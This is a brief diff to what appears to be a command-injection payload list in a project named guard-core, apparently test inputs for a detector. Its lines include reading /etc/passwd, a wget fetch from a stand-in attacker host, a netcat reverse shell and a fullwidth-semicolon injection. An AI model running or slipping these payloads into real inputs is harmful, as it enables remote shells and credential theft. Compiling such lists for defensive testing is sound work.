@@ -2,3 +2,6 @@
 # license: guard-core (project)
 ; cat /etc/passwd
 | wget http://evil.example/x
+# source: campaign-derived, verified
+|(nc -e /bin/sh 10.0.0.1 4444)
+test；ls
